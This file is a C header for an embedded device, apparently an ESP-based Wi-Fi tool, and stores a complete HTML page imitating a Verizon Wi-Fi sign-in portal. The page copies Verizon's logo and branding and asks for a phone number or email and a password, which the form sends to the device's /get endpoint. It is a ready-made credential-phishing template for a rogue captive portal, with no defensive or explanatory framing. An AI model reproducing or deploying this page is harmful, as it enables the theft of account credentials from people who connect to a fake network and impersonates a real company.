#ifndef VERIZON_H
#define VERIZON_H

const char VERIZON[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verizon Wi-Fi Login</title>
    <style>
        /* Embedded Tailwind-like CSS for Verizon Branding */
        /* Base styles */
        body {
            margin: 0;
            padding: 0;
            font-family: sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            background-image: linear-gradient(to bottom right, #7B0000, #CD0A0A, #FF4136); /* Smoother Verizon gradient */
        }

        .login-container {
            background-color: rgba(255, 255, 255, 0.15); /* Slightly more opaque for better backdrop effect */
            backdrop-filter: blur(10px); /* Slightly stronger blur */
            -webkit-backdrop-filter: blur(10px);
            border-radius: 1.25rem; /* Rounded corners */
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3); /* More pronounced initial shadow */
            padding: 2.5rem; /* Increased padding */
            max-width: 28rem;
            width: 100%;
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.3); /* Clearer white border */
            transform: translateY(0);
            transition: all 400ms cubic-bezier(0.4, 0, 0.2, 1);
        }
        .login-container:hover {
            transform: translateY(-0.25rem) scale(1.01); /* More distinct hover effect */
            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.4); /* Darker shadow on hover */
        }

        /* Typography */
        .header-section {
            margin-bottom: 2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .main-title {
            font-size: 2.25rem; /* Larger title */
            line-height: 2.5rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 0.75rem; /* Adjusted margin */
            color: #fff; /* Ensure text is white */
            text-shadow: 0 2px 4px rgba(0,0,0,0.2); /* Subtle text shadow */
        }
        .sub-title {
            font-size: 1.125rem; /* Slightly larger subtitle */
            line-height: 1.75rem;
            font-weight: 300;
            text-align: center;
            margin-bottom: 2rem;
            opacity: 0.9; /* Slightly less opaque for better readability */
            color: #fff;
        }

        /* Form elements */
        .input-group {
            margin-bottom: 1.25rem; /* Increased margin between inputs */
            display: flex;
            justify-content: center;
            width: 100%;
        }
        .form-input {
            appearance: none;
            background-color: rgba(255, 255, 255, 0.2); /* Semi-transparent white background */
            border: 1px solid rgba(255, 255, 255, 0.4); /* Clearer white border */
            border-radius: 0.625rem; /* More rounded */
            padding: 0.875rem 1.25rem; /* Larger padding */
            font-size: 1.125rem; /* Larger font size */
            line-height: 1.5;
            color: #fff; /* White text */
            width: 100%;
            max-width: 20rem;
            transition: all 250ms ease-in-out;
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.7); /* Lighter placeholder */
            opacity: 1; /* Ensure opacity is applied */
        }
        .form-input:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(205, 10, 10, 0.9); /* Stronger Verizon Red focus ring */
            border-color: transparent;
            background-color: rgba(255, 255, 255, 0.3); /* Slightly brighter background on focus */
        }

        /* Button */
        .button-wrapper {
            display: flex;
            justify-content: center;
            margin-top: 2rem; /* More space above button */
        }
        .action-button {
            max-width: 20rem;
            width: 100%;
            background-color: #CD0A0A; /* Verizon Red */
            color: #fff;
            font-weight: 600;
            padding: 1rem 2rem; /* Larger padding for button */
            border-radius: 0.625rem; /* More rounded */
            box-shadow: 0 15px 25px -5px rgba(0, 0, 0, 0.2), 0 8px 10px -4px rgba(0, 0, 0, 0.1); /* Stronger shadow */
            transition: all 350ms cubic-bezier(0.4, 0, 0.2, 1);
            transform: translateY(0);
            cursor: pointer;
            appearance: none;
            border: none;
            line-height: inherit;
            font-size: 1.125rem; /* Larger font size for button text */
            letter-spacing: 0.05em; /* Slight letter spacing */
        }
        .action-button:hover {
            background-color: #A00000; /* Darker red on hover */
            transform: translateY(-0.35rem) scale(1.02); /* More lift and slight scale */
            box-shadow: 0 20px 35px -8px rgba(0, 0, 0, 0.3); /* Darker shadow on hover */
        }
        .action-button:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(205, 10, 10, 0.9); /* Stronger focus ring */
        }

        /* Verizon Logo SVG styling */
        .verizon-logo {
            height: 3.5rem; /* Slightly larger logo */
            width: auto;
            margin-bottom: 2.5rem; /* More space below the logo */
            fill: #fff;
        }

        /* Footer */
        .footer-text {
            text-align: center;
            font-size: 0.875rem;
            opacity: 0.8;
            margin-top: 2.5rem; /* More space above footer */
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Verizon Logo SVG -->
        <div class="header-section">
            <svg class="verizon-logo" viewBox="-98.58 -36.425 854.36 218.55" fill="#fff" xmlns="http://www.w3.org/2000/svg">
                <path d="M593.3 47.7h-14.6l22.2 47.6h11.8L657.2 0h-14.5l-35.9 76.8z"/>
                <path d="M488.7 142.6h28.9V89.7c0-12.1 7-20.6 17.4-20.6 10 0 15.2 7 15.2 17.1v56.4h28.9V80.7c0-21-12.6-35.8-33-35.8-13 0-22.1 5.6-28.9 15.8h-.6v-13h-28zm-56.8-97.5c-30.2 0-50.4 21.7-50.4 50.3 0 28.4 20.2 50.3 50.4 50.3s50.4-21.9 50.4-50.3c.1-28.6-20.2-50.3-50.4-50.3zm-.2 79.2c-13.7 0-21-11.5-21-28.9 0-17.6 7.2-28.9 21-28.9 13.7 0 21.3 11.3 21.3 28.9.1 17.4-7.5 28.9-21.3 28.9zm-132.6 18.3h81.2v-22.8h-46v-.6l44-49.3V47.6h-79.2v22.9h44.5v.6l-44.5 49.7zm-37.1 0h29.1V47.7H262zm-67.5 0h29V99c0-19.8 11.9-28.6 30-26.1h.6v-25c-1.5-.6-3.2-.7-5.9-.7-11.3 0-18.9 5.2-25.4 16.3h-.6V47.7h-27.7zm-53.2-18.2c-12.8 0-20.6-8.3-22.1-21.1h68.4c.2-20.4-5.2-36.7-16.5-46.9-8-7.4-18.5-11.5-31.9-11.5-28.6 0-48.4 21.7-48.4 50.1 0 28.6 18.9 50.4 50.3 50.4 11.9 0 21.3-3.2 29.1-8.5 8.3-5.7 14.3-14.1 15.9-22.4h-27.8c-2.7 6.2-8.5 9.9-17 9.9zm-1.5-58.8c10.2 0 17.2 7.6 18.4 18.7h-38.8c2.3-11.2 8.4-18.7 20.4-18.7zM33 142.6h30.4l33-94.9H67.3l-18.5 61h-.4l-18.5-61H0zM262 13.9h29.1v25.8H262z" fill="#fff"/>
            </svg>
            <h1 class="main-title">Verizon Wi-Fi!</h1>
            <h2 class="sub-title">Please sign in to connect</h2>
        </div>

        <form action="/get" id="email-form-step">
            <div class="input-group">
                <input
                    name="username"
                    type="text"
                    class="form-input"
                    placeholder="Phone Number or Email"
                    required
                    aria-label="Phone Number or Email"
                >
            </div>
            <div class="input-group">
                <input
                    name="password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                >
            </div>
            <div class="button-wrapper">
                <button
                    type="submit"
                    class="action-button"
                >
                    Connect to Wi-Fi
                </button>
            </div>
        </form>
        <div class="footer-text">
            <p>&copy; 2025 Verizon. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
)rawliteral";
#endif